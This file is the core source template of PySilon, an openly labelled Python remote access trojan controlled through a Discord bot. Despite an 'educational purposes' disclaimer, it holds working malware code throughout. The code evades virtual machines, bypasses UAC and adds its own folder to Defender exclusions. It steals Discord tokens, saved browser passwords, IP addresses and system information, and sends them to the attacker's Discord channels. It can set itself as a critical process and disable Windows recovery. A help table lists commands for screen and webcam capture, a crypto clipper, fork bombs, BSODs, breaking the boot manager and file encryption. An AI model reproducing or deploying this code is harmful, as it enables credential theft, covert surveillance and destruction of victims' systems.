
# !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! #
# !!  DON'T COMPILE OR RUN THIS FILE. IT WILL NOT WORK. INSTEAD, RUN PySilon.bat AND AFTER CLICKING 'COMPILE'  !! #
# !!  YOU CAN TEST BY RUNNING source_prepared.py (THIS IS THE FINAL VERSON OF SOURCE CODE BEFORE COMPILING)    !! #
# !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! #

###############################################################################
##                                                                           ##
##   DISCLAIMER !!! READ BEFORE USING                                        ##
##                                                                           ##
##   Information and code provided in this project are                       ##
##   for educational purposes only. The creator is no                        ##
##   way responsible for any direct or indirect damage                       ##
##   caused due to the misusage of the information.                          ##
##                                                                           ##
##   Everything you do, you are doing at your own risk and responsibility.   ##
##                                                                           ##
###############################################################################

import time
import os

try: os.mkdir('logs') # [pysilon_mark] !debug
except: pass # [pysilon_mark] !debug
logs_file_name = f'executed_at_{time.strftime("%Y-%m-%d_%H-%M-%S")}.log' # [pysilon_mark] !debug
with open(f'logs/{logs_file_name}', 'w', encoding='utf-8') as create_logs_file: pass # [pysilon_mark] !debug

def log(entry): # [pysilon_mark] !debug
    with open(f'logs/{logs_file_name}', 'a', encoding='utf-8') as log_entry: log_entry.write(f'[{time.strftime("%Y.%m.%d-%H:%M:%S")}] {entry}\n') # [pysilon_mark] !debug

# [pysilon_var] $modules 0
from resources.protections import protection_check, fake_mutex_code # [pysilon_mark] !anti-vm
from resources.discord_token_grabber import * # [pysilon_mark] !grabber
from resources.passwords_grabber import * # [pysilon_mark] !grabber
from urllib.request import urlopen
from resources.uac_bypass import *
from itertools import islice
from resources.misc import *
from getpass import getuser
from shutil import rmtree
import subprocess
import threading
import discord
import asyncio
import base64
import psutil
import json
import sys
import re
#.log Imported modules

if protection_check(): # [pysilon_mark] !anti-vm
    os._exit(0) # [pysilon_mark] !anti-vm

if not IsAdmin():
    if GetSelf()[1]:
        if UACbypass():
            os._exit(0)
#.log UAC bypassed successfully

auto = 'auto'

#
#
#    READ BEFORE TESTING!
#
#    1. If you encounter any errors, please let me know and I will be more than happy to help. [https://github.com/mategol/PySilon-malware/issues/new/choose]
#    2. I highly SUGGEST you to test compiled executable on Virtual Machnine before you will "give it a use".
#       If there would be any errors (probably wont but it's still freaking Windows), I could fix them for you.
#
#    HOW TO COMPILE:
#
#    start PySilon.bat
#
#

#####################################################################
## Following settings are configured by the builder.py by itself   ##
## Please do not touch basically anything to avoid unwanted errors ##
bot_tokens = []                                                    ##
software_registry_name = ''                                        ##
software_directory_name = ''                                       ##
software_executable_name = ''                                      ##
channel_ids = {                                                    ##
    'info': auto,                                                  ##
    'main': auto,                                                  ##
    'spam': auto,                                                  ##
    'file': auto,                                                  ##
    'recordings': auto,                                            ##
    'voice': auto                                                  ##
}                                                                  ##
secret_key = ''                                                    ##
guild_id = auto                                                    ##
## If you like this project, please leave me a Star on GitHub ;)   ##
#####################################################################

if fake_mutex_code(software_executable_name.lower()) and os.path.basename(sys.executable).lower() != software_executable_name.lower(): # [pysilon_mark] !anti-vm
    os._exit(0) # [pysilon_mark] !anti-vm
#.log Executed fake mutex code check # [pysilon_mark] !anti-vm

if IsAdmin():
    exclusion_paths = [f'C:\\Users\\{getuser()}\\{software_directory_name}']
    for path in exclusion_paths:
        try:
            subprocess.run(['powershell', '-Command', f'Add-MpPreference -ExclusionPath "{path}"'], creationflags=subprocess.CREATE_NO_WINDOW)
        except: pass
#.log Added itself to Defender exclusions

client = discord.Client(intents=discord.Intents.all())
# [pysilon_var] !opus_initialization 0
    
ctrl_codes = {'\\x01': '[CTRL+A]', '\\x02': '[CTRL+B]', '\\x03': '[CTRL+C]', '\\x04': '[CTRL+D]', '\\x05': '[CTRL+E]', '\\x06': '[CTRL+F]', '\\x07': '[CTRL+G]', '\\x08': '[CTRL+H]', '\\t': '[CTRL+I]', '\\x0A': '[CTRL+J]', '\\x0B': '[CTRL+K]', '\\x0C': '[CTRL+L]', '\\x0D': '[CTRL+M]', '\\x0E': '[CTRL+N]', '\\x0F': '[CTRL+O]', '\\x10': '[CTRL+P]', '\\x11': '[CTRL+Q]', '\\x12': '[CTRL+R]', '\\x13': '[CTRL+S]', '\\x14': '[CTRL+T]', '\\x15': '[CTRL+U]', '\\x16': '[CTRL+V]', '\\x17': '[CTRL+W]', '\\x18': '[CTRL+X]', '\\x19': '[CTRL+Y]', '\\x1A': '[CTRL+Z]'}
text_buffor, force_to_send = '', False
messages_to_send, files_to_send, embeds_to_send = [], [], []
processes_messages, processes_list, process_to_kill = [], [], ''
files_to_merge, expectation, one_file_attachment_message = [[], [], []], None, None
cookies_thread, implode_confirmation, cmd_messages = None, None, []
send_recordings, input_blocked, clipper_stop, turned_off, custom_message_to_send = True, False, True, False, [None, None, None]
latest_messages_in_recordings = []
# [pysilon_var] !registry 0

working_directory = ['C:', 'Users', getuser(), software_directory_name]

@client.event
async def on_ready():
    global force_to_send, messages_to_send, files_to_send, embeds_to_send, channel_ids, cookies_thread, latest_messages_in_recordings
    #.log BOT loaded
    hwid = subprocess.check_output("powershell (Get-CimInstance Win32_ComputerSystemProduct).UUID").decode().strip()
    #.log HWID obtained
    first_run = True
    for category_name in client.get_guild(guild_id).categories:
        if hwid in str(category_name):
            first_run, category = False, category_name
            break
    #.log Checked for the first run

    if not first_run:
        #.log PySilon is not running for the first time
        category_channel_names = []
        for channel in category.channels:
            category_channel_names.append(channel.name)
        #.log Obtained the channel names in HWID category
        
        if 'spam' not in category_channel_names and channel_ids['spam']: 
            #.log Spam channel is missing
            temp = await client.get_guild(guild_id).create_text_channel('spam', category=category)
            channel_ids['spam'] = temp.id
            #.log Created spam channel
        
        if 'recordings' not in category_channel_names and channel_ids['recordings']: 
            #.log Recording channel is missing
            temp = await client.get_guild(guild_id).create_text_channel('recordings', category=category)
            channel_ids['recordings'] = temp.id
            #.log Created recordings channel

        if 'file-related' not in category_channel_names and channel_ids['file']: 
            #.log File-related channel is missing
            temp = await client.get_guild(guild_id).create_text_channel('file-related', category=category)
            channel_ids['file'] = temp.id
            #.log Created file-related channel
        
        if 'Live microphone' not in category_channel_names and channel_ids['voice']: 
            #.log Live microphone channel is missing
            temp = await client.get_guild(guild_id).create_voice_channel('Live microphone', category=category)
            channel_ids['voice'] = temp.id
            #.log Created live microphone channel
        
    if first_run:
        #.log PySilon is running for the first time
        category = await client.get_guild(guild_id).create_category(hwid)
        #.log Created HWID category
        temp = await client.get_guild(guild_id).create_text_channel('info', category=category); channel_ids['info'] = temp.id
        #.log Created info channel
        temp = await client.get_guild(guild_id).create_text_channel('main', category=category); channel_ids['main'] = temp.id
        #.log Created main channel
        if channel_ids['spam'] == True: temp = await client.get_guild(guild_id).create_text_channel('spam', category=category); channel_ids['spam'] = temp.id
        #.log Created spam channel
        if channel_ids['recordings'] == True: temp = await client.get_guild(guild_id).create_text_channel('recordings', category=category); channel_ids['recordings'] = temp.id
        #.log Created recordings channel
        if channel_ids['file'] == True: temp = await client.get_guild(guild_id).create_text_channel('file-related', category=category); channel_ids['file'] = temp.id
        #.log Created file-related channel
        if channel_ids['voice'] == True: temp = await client.get_guild(guild_id).create_voice_channel('Live microphone', category=category); channel_ids['voice'] = temp.id
        #.log Created live microphone channel

        try: 
            await client.get_channel(channel_ids['info']).send('```IP address: ' + urlopen('https://ident.me').read().decode('utf-8') + ' [ident.me]```')
            #.log Sent IP address obtained from ident.me
        except: pass
        try:
            await client.get_channel(channel_ids['info']).send('```IP address: ' + urlopen('https://ipv4.lafibre.info/ip.php').read().decode('utf-8') + ' [lafibre.info]```')
            #.log Sent IP address obtained from lafibre.info
        except: pass
        system_info = force_decode(subprocess.run('systeminfo', capture_output= True, shell= True).stdout).strip().replace('\\xff', ' ')
        #.log Obtained system information

        chunk = ''
        for line in system_info.split('\n'):
            if len(chunk) + len(line) > 1990:
                await client.get_channel(channel_ids['info']).send('```' + chunk + '```')
                chunk = line + '\n'
            else:
                chunk += line + '\n'
        await client.get_channel(channel_ids['info']).send('```' + chunk + '```')
        #.log Sent system information on info channel

        accounts = grab_discord.initialize(False) # [pysilon_mark] !grabber
        for account in accounts: # [pysilon_mark] !grabber
            reaction_msg = await client.get_channel(channel_ids['info']).send(embed=account); await reaction_msg.add_reaction('📌') # [pysilon_mark] !grabber

        result = grab_passwords() # [pysilon_mark] !grabber
        embed=discord.Embed(title='Grabbed saved passwords', color=0x0084ff) # [pysilon_mark] !grabber
        for url in result.keys(): # [pysilon_mark] !grabber
            embed.add_field(name='🔗 ' + url, value='👤 ' + result[url][0] + '\n🔑 ' + result[url][1], inline=False) # [pysilon_mark] !grabber
        reaction_msg = await client.get_channel(channel_ids['info']).send(embed=embed); await reaction_msg.add_reaction('📌') # [pysilon_mark] !grabber

    else:
        #.log Fetching channel IDs...
        for channel in category.channels:
            if channel.name == 'info':
                channel_ids['info'] = channel.id
                #.log Obtained info channel ID
            elif channel.name == 'main':
                channel_ids['main'] = channel.id
                #.log Obtained main channel ID
            elif channel.name == 'spam':
                channel_ids['spam'] = channel.id
                #.log Obtained spam channel ID
            elif channel.name == 'file-related':
                channel_ids['file'] = channel.id
                #.log Obtained file-related channel ID
            elif channel.name == 'recordings':
                channel_ids['recordings'] = channel.id
                #.log Obtained recordings channel ID
            elif channel.name == 'Live microphone':
                channel_ids['voice'] = channel.id
                #.log Obtained live microphone channel ID

    await client.get_channel(channel_ids['main']).send(f"_ _\n_ _\n_ _```Starting new PC session at {current_time(True)} on HWID:{str(hwid)}{' && Bypassed UAC!' if IsAdmin() else ''}```\n_ _\n_ _\n_ _")
    #.log Sent new session info message on main channel

# [pysilon_var] !recording_startup 1
# [pysilon_var] !process_blacklister 1
    
    while True:
        global send_recordings
        recordings_obj = client.get_channel(channel_ids['recordings'])
        #.log Fetched the recordings channel
        async for latest_message in recordings_obj.history(limit=2):
            latest_messages_in_recordings.append(latest_message.content)
        #.log Fetched last message from recordings channel
        if 'disable' in latest_messages_in_recordings:
            send_recordings = False
            #.log Recordings are disabled by the attacker
        else:
            send_recordings = True
            #.log Recordings are enabled by the attacker

        latest_messages_in_recordings = []
        if len(messages_to_send) > 0:
            #.log New message to send
            for message in messages_to_send:
                #.log Trying to send a message
                await client.get_channel(message[0]).send(message[1])
                #.log Sent a message
                await asyncio.sleep(0.1)
            messages_to_send = []
        if len(files_to_send) > 0:
            #.log New file to send
            for file in files_to_send:
                #.log Trying to send a file
                await client.get_channel(file[0]).send(file[1], file=discord.File(file[2], filename=file[2]))
                #.log File successfully sent
                await asyncio.sleep(0.1)
                #.log Checking if file needs to be removed from victim\'s PC
                if file[3]:
                    #.log Trying to remove a file
                    subprocess.run('del ' + file[2], shell=True)
                    #.log Removed a file
            files_to_send = []
        if len(embeds_to_send) > 0:
            #.log New embed to send
            for embedd in embeds_to_send:
                #.log Trying to send an embed
                if len(embedd) == 3:
                    await client.get_channel(embedd[0]).send(embed=discord.Embed(title=embedd[1], color=0x0084ff).set_image(url='attachment://' + embedd[2]), file=discord.File(embedd[2]))
                else:
                    await client.get_channel(embedd[0]).send(embed=embedd[1])
                #.log Sent an embed
                await asyncio.sleep(0.1)
            embeds_to_send = []
# [pysilon_var] !cookies_submit 2
        await asyncio.sleep(1)

@client.event
async def on_raw_reaction_add(payload):
    #.log New reaction added (to message from different BOT session)
    message = await client.get_channel(payload.channel_id).fetch_message(payload.message_id)
    #.log Fetched reacted message
    reaction = discord.utils.get(message.reactions, emoji=payload.emoji.name)
    #.log Fetched reaction from message
    user = payload.member
    #.log Fetched reacting user
  
    if user.bot == False:
        #.log Reacting user is not a BOT
        if str(reaction) == '📌':
            #.log Reaction is "pin the message"
            if message.channel.id in channel_ids.values():
                await message.pin()
                #.log Pinned a message
                last_message = await discord.utils.get(message.channel.history())
                #.log Obtained alert about pin
                await last_message.delete()
                #.log Deleted alert about pin
        elif str(reaction) == '🔴':
            #.log Reaction is "delete the message"
            await message.delete()
            #.log Deleted the message

@client.event
async def on_reaction_add(reaction, user):
    global tree_messages, messages_from_sending_big_file, expectation, files_to_merge, processes_messages, process_to_kill, expectation, cmd_messages, custom_message_to_send
    #.log New reaction added (to message from current BOT session)
    if user.bot == False:
        #.log Reacting user is not a BOT
        if reaction.message.channel.id in channel_ids.values():
            #.log Reaction channel is controlling this PC
            try:
                #.log Trying to fetch the reaction expectations
                if str(reaction) == '💀' and expectation == 'implosion':
                    #.log Reaction is "implode"
                    await reaction.message.channel.send('```PySilon will try to implode after sending this message. So if there\'s no more messages, the cleanup was successful.```')
                    #.log Sent a message about trying to implode
# [pysilon_var] !registry_implosion 5
                    #.log Trying to remove PySilon.key
                    secure_delete_file(f'C:\\Users\\{getuser()}\\{software_directory_name}\\PySilon.key', 10)
                    #.log Removed PySilon.key. Trying to remove recordings directory
                    try:
                        rmtree('rec_')
                        #.log Removed recordings directory
                    except:
                        #.log Couldn\'t remove recordings directory. Ignoring the error
                        pass
                    ctypes.windll.ntdll.RtlSetProcessIsCritical(0, 0, 0)
                    #.log Unset critical process
                    with open(f'C:\\Users\\{getuser()}\\implode.bat', 'w', encoding='utf-8') as imploder:
                        if IsAdmin(): attrib_value = f'attrib -s -h "C:\\Users\\{getuser()}\\{software_directory_name}"'
                        else: attrib_value = f'attrib -h "C:\\Users\\{getuser()}\\{software_directory_name}"'
                        imploder.write(f'pushd "C:\\Users\\{getuser()}"\n{attrib_value}\ntaskkill /f /im "{software_executable_name}"\ntimeout /t 3 /nobreak\nrmdir /s /q "C:\\Users\\{getuser()}\\{software_directory_name}"\ndel "%~f0"')
                    #.log Saved implode.bat
                    subprocess.Popen(f'C:\\Users\\{getuser()}\\implode.bat', creationflags=subprocess.CREATE_NO_WINDOW)
                    #.log Executed implode.bat. Killing PySilon...
                    sys.exit(0)
                elif str(reaction) == '🔴' and expectation == 'implosion':
                    #.log Reaction is "cancel implosion"
                    expectation = None
# [pysilon_var] on reaction add 4
            except Exception as err:
                #.log Failed to fetch the reaction expectations
                await reaction.message.channel.send(f'```{str(err)}```')
                #.log Sent a message with error details

@client.event
async def on_raw_reaction_remove(payload):
    #.log A reaction has been removed
    message = await client.get_channel(payload.channel_id).fetch_message(payload.message_id)
    #.log Fetched reacted message
    reaction = discord.utils.get(message.reactions, emoji=payload.emoji.name)
    #.log Fetched reaction
    user = payload.member
    #.log Fetched reacting user

    if str(reaction) == '📌':
        #.log Reaction is "unpin"
        await message.unpin()
        #.log Unpinned reacted message

help = {
    'commands': {
        'ss': ['➡️ `.ss`', 'Takes a screenshot of the victim\'s PC'],
        'screenrec': ['➡️ `.screenrec`', 'Records the screen of the victim\'s PC for 15 seconds'],
        'join': ['➡️ `.join`', 'Makes the BOT join a voice channel and live-stream microphone input'],
        'show': ['➡️ `.show <what-to-show>`', 'Displays information about specified subject. Options:\n🔹processes - displays all running processes'],
        'kill': ['➡️ `.kill <process-name>`', 'Kills a specified process. Options:\n🔹process-name - kills a specific process based on .show generated process-names'],
        'block-input': ['➡️ `.block-input`', 'Blocks keyboard and mouse inputs of the victim\'s PC'],
        'unblock-input': ['➡️ `.unblock-input`', 'Unblocks keyboard and mouse inputs of the victim\'s PC'],
        'start-clipper': ['➡️ `.start-clipper`', 'Starts the Crypto Clipper thread on the victim\'s PC'],
        'stop-clipper': ['➡️ `.stop-clipper`', 'Stops the Crypto Clipper thread on the victim\'s PC'],
        'set-critical': ['➡️ `.set-critical`', 'Elevates the process to critical status.'],
        'unset-critical': ['➡️ `.unset-critical`', 'Removes the critical status from the process.'],
        'grab': ['➡️ `.grab <what-to-grab>`', 'Grabs specified information. Options:\n🔹passwords - grabs all browser-saved passwords\n🔹history - grabs the browser history\n🔹cookies - grabs browser-cookies\n🔹wifi - grabs all WiFi saved passwords\n🔹discord - grabs all possible information from victim\'s Discord account\n🔹all - grabs discord information, passwords & cookies'],
        'clear': ['➡️ `.clear`', 'Clears all messages on the file-related channel'],
        'pwd': ['➡️ `.pwd`', 'Displays current directory path'],
        'ls': ['➡️ `.ls`', 'Lists current directory content'],
        'cd': ['➡️ `.cd <directory>`', 'Changes working directory. Options:\n🔹directory - the destination directory (.. is the previous directory)'],
        'tree': ['➡️ `.tree`', 'Displays the current directory\'s structure'],
        'download': ['➡️ `.download <file-or-directory-name>`', 'Downloads specified file or folder. Options:\n🔹file-or-directory-name - name of file or directory that you want to download'],
        'upload': ['➡️ `.upload <type> <name>`', 'Uploads a file to victim\'s PC. Options:\n🔹type - single/multiple files whether it\'s smaller or larger than 25MB (single=smaller, multiple=larger)\n🔹name - name of uploaded file on victim\'s PC'],
        'execute': ['➡️ `.execute <file-name>`', 'Execute specified file on the victim\'s PC'],
        'remove': ['➡️ `.remove <file-or-directory-name>`', 'Removes the specified file or directory. Options:\n🔹file-or-directory-name - name of file or directory that you want to remove'],
        'key': ['➡️ `.key <what-to-type>`', 'Simulates typing on the victim\'s PC. Options:\n🔹ALTF4 - performs the Alt+F4 shortcut\n🔹ALTTAB - performs the Alt+Tab shortcut'],
    },
    'commands2': {
        'blacklist': ['➡️ `.blacklist <process-name>`', 'Adds the specified process to the blacklist.'],
        'whitelist': ['➡️ `.whitelist <process-name>`', 'Removes the specified process from the blacklist.'],
        'turnoff': ['➡️ `.turnoff`', 'Turns all monitors off'],
        'turnon': ['➡️ `.turnon`', 'Turns all monitors on'],
        'block-website': ['➡️ `.block-website <url>`', 'Blocks the specified website from being accessed from any browser.'],
        'unblock-website': ['➡️ `.unblock-website <url>`', 'Unblocks access to a previously blocked website.'],
        'webcam': ['➡️ `.webcam photo`', 'Takes a photo of a victim\'s webcam (if one is detected)'],
        'forkbomb': ['➡️ `.forkbomb`', 'Creates a self-replicating process until the victim\'s PC crashes.'],
        'volume': ['➡️ `.volume`', 'Change the speaker volume on the victim\'s PC.'],
        'play': ['➡️ `.play`', 'Play any .mp3 file on the victim\'s PC.'],
        'tts': ['➡️ `.tts <message>`', 'Plays a Text-to-Speech voice message.'],
        'msg': ['➡️ `.msg <parameters>`', 'Displays a custom message box to the victim\'s PC. Parameters:\n🔹text="" - The main text of the msg box\n🔹title="" - The title of the msg box\n🔹style="" - The msg box style (1, 2, 3, 4, 5, 6)'],
        'cmd': ['➡️ `.cmd <command>`', 'Executes specified Command Prompt command on the victim\'s PC and sends back the output. Options:\n🔹command - a CMD command that will be executed on victim\'s PC'],
        'bsod': ['➡️ `.bsod`', 'Triggers a Blue Screen of Death on the victim\'s PC.'],
        'jumpscare': ['➡️ `.jumpscare`', 'Plays a very loud & rapidly flashing video.'],
        'break-windows': ['➡️ `.break-windows`', 'Destroys Windows by renaming the boot manager. (Dangerous)'],
        'disable-reset': ['➡️ `.disable-reset`', 'Disables windows recovery (ReAgentC)'],
        'enable-reset': ['➡️ `.enable-reset`', 'Enables windows recovery (ReAgentC)'],
        'encrypt': ['➡️ `.encrypt <directory>`', 'Encrypts every file in the specified directory'],
        'decrypt': ['➡️ `.decrypt <directory>`', 'Decrypts every file in the specified directory'],
        'implode': ['➡️ `.implode`', 'Entirely wipes the malware off of the victim\'s PC (to remove traces).']
    }
}

@client.event
async def on_message(message):
    global channel_ids, vc, working_directory, tree_messages, messages_from_sending_big_file, files_to_merge, expectation, one_file_attachment_message, processes_messages, processes_list, process_to_kill, cookies_thread, implode_confirmation, cmd_messages, keyboard_listener, mouse_listener, clipper_stop, input_blocked, custom_message_to_send, turned_off
    #.log New message logged
    if message.author != client.user:
        if message.content == f'<@{client.user.id}>':
            #.log Author mentioned PySilon BOT
            await client.get_channel(channel_ids['main']).send(f'<@{message.author.id}>')
            #.log Sent message with mention of Author
        #.log Author is not a BOT
        if message.channel.id in channel_ids.values():
            #.log Message channel is controlling this PC
            if message.content == '.implode':
                #.log Message is "implode"
                await message.delete()
                #.log Removed the message
                await message.channel.send('``` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` ```\n\n```Send here PySilon.key generated along with RAT executable```\n\n')
                expectation = 'key'
                #.log Sent further instructions for implosion
            
            elif message.content == '.restart':
                #.log Message is "restart"
                await message.delete()
                #.log Removed the message
                await message.channel.send('```PySilon will be restarted now... Stand by...```')
                #.log Sent message about restart
                os.startfile(f'C:\\Users\\{getuser()}\\{software_directory_name}\\{software_executable_name}')
                #.log Executed PySilon. Killing itself
                sys.exit(0)
                
            elif message.content[:5] == '.help':
                
                await message.delete()
                
                if message.content.strip() == '.help':
                    #.log Author wants general help
                    embed = discord.Embed(title='List of all available commands', color=0x49fc03)
                    for i in help['commands'].keys():
                        embed.add_field(name=help['commands'][i][0], value=help['commands'][i][1], inline=False)
                    await message.channel.send(embed=embed)
                    embed = discord.Embed(color=0x49fc03)
                    for i in help['commands2'].keys():
                        embed.add_field(name=help['commands2'][i][0], value=help['commands2'][i][1], inline=False)
                    await message.channel.send(embed=embed)
                    #.log Sent message with PySilon commands manual
                
            elif message.content == '.set-critical':
                #.log Message is set-critical
                await message.delete()
                #.log Removed the message
                try:
                    ctypes.windll.ntdll.RtlAdjustPrivilege(20, 1, 0, ctypes.byref(ctypes.c_bool()))
                    ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0) == 0
                    #.log Set PySilon as a critical process
                    embed = discord.Embed(title="🟣 System",description=f'```Process elevated to critical status successfully.\nWarning: This critical process can cause of BSOD when the victim tries to shut down their system.```', colour=discord.Colour.purple())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                    #.log Sent success message
                except: 
                    await message.channel.send('`Something went wrong while elevating the process`')
                    #.log Something went wrong when setting critical process

            elif message.content == '.unset-critical':
                #.log Message is unset-critical
                await message.delete()
                #.log Removed the message
                try:
                    ctypes.windll.ntdll.RtlSetProcessIsCritical(0, 0, 0)
                    #.log Removed PySilon from critical processes
                    embed = discord.Embed(title="🟣 System",description=f'```Successfully removed critical status from process.```', colour=discord.Colour.purple())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                    #.log Sent success message
                except: 
                    await message.channel.send('`Something went wrong while removing critical status`')
                    #.log Something went wrong when unsetting critical process

            elif message.content == '.disable-reset':
                #.log Message is disable-reset
                await message.delete()
                #.log Removed the message
                if IsAdmin():
                    subprocess.run('reagentc.exe /disable', creationflags=subprocess.CREATE_NO_WINDOW)
                    #.log Disabled ReAgentC
                    embed = discord.Embed(title="🟣 System",description=f'```Successfully disabled REAgentC.```', colour=discord.Colour.purple())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                    #.log Sent success message
                else:
                    embed = discord.Embed(title="📛 Error",description=f'```Disabling REAgentC requires elevation.```', colour=discord.Colour.purple())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                    #.log Sent error message for missing permissions

            elif message.content == '.enable-reset':
                #.log Message is disable-reset
                await message.delete()
                #.log Removed the message
                if IsAdmin():
                    subprocess.run('reagentc.exe /enable', creationflags=subprocess.CREATE_NO_WINDOW)
                    #.log Disabled ReAgentC
                    embed = discord.Embed(title="🟣 System",description=f'```Successfully enabled REAgentC.```', colour=discord.Colour.purple())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                    #.log Sent success message
                else:
                    embed = discord.Embed(title="📛 Error",description=f'```Enabling REAgentC requires elevation.```', colour=discord.Colour.purple())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                    #.log Sent error message for missing permissions

            elif expectation == 'key':
                #.log Message is PySilon.key candidate
                try:
                    split_v1 = str(message.attachments).split("filename='")[1]
                    #.log Message has a file attached
                    filename = str(split_v1).split("' ")[0]
                    filename = f'C:\\Users\\{getuser()}\\{software_directory_name}\\' + filename
                    #.log Fetched file name
                    await message.attachments[0].save(fp=filename)
                    #.log Downloaded the attached file
                    if get_file_hash(filename) == secret_key:
                        #.log File\'s checksum is same as secret key
                        reaction_msg = await message.channel.send('```You are authorized to remotely remove PySilon RAT from target PC. Everything related to PySilon will be erased after you confirm this action by reacting with "💀".\nWARNING! This cannot be undone after you decide to proceed. You can cancel it, by reacting with "🔴".```')
                        #.log Sent message that Author is authorized to implode PySilon
                        await reaction_msg.add_reaction('💀')
                        #.log Added "implode" reaction
                        await reaction_msg.add_reaction('🔴')
                        #.log Added "cancel implosion" reaction
                        expectation = 'implosion'
                    else:
                        #.log Message does not contain valid PySilon.key for this copy
                        reaction_msg = await message.channel.send('```❗ Provided key is invalid```'); await reaction_msg.add_reaction('🔴')
                        #.log Sent message about denial of access
                        expectation = None
                except Exception as err: 
                    #.log An error occurred while fetching the PySilon.key candidate
                    await message.channel.send(f'```❗ Something went wrong while fetching secret key...\n{str(err)}```')
                    #.log Sent information about the error
                    expectation = None

# [pysilon_var] on message 3

# [pysilon_var] on message end 3

# [pysilon_var] anywhere 0
 
# [pysilon_var] bottom 0
